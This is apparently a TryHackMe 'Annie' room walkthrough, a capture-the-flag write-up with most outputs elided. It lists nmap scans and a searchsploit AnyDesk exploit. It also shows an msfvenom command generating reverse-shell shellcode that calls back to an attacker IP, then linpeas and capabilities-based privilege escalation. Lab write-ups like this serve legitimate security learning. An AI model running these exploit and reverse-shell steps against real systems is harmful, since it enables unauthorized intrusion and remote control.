...
This is a **TryHackMe** room which can be found at: {{< rawhtml >}}<a href="https://tryhackme.com/room/annie" target="_blank" style="color:#E30F0F;">Annie</a>{{< /rawhtml >}}
...
- {{< rawhtml >}}Command: {{< /rawhtml >}} `nmap -p- -T4 -v 10.10.235.134`
```shell
...
- {{< rawhtml >}}Command: {{< /rawhtml >}} `sudo nmap -A -sC -p 22,7070,33401,40045 -v 10.10.235.134`
```shell
...
- {{< rawhtml >}}Command: {{< /rawhtml >}} `sudo nmap -sU -v -p 50001 10.10.235.134`
```shell
...
- {{< rawhtml >}}Command: {{< /rawhtml >}} `searchsploit anydesk`
```shell
...
- {{< rawhtml >}}Command to mirror (copy) the exploit: {{< /rawhtml >}} `searchsploit -m linux/remote/49613.py`
...
- {{< rawhtml >}}Command: {{< /rawhtml >}} `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.8.200.50 LPORT=443 -b "\x00\x25\x26" -f python -v shellcode`
```shell
...
- {{< rawhtml >}}Command: {{< /rawhtml >}} `python2 49613.py`
```shell
...
Download `linpeas.sh` from PEASS-ng github page (https://github.com/carlospolop/PEASS-ng/releases/tag/20220821) and transfer it to the victim machine.
...
This process can be found in this great article: https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/

Proof of Concept (PoC image):
{{< rawhtml >}}
  <img src="../../../thm/annie/annie.png" alt="Annie photo" style="width:700px;height:300px;">
{{< /rawhtml >}}
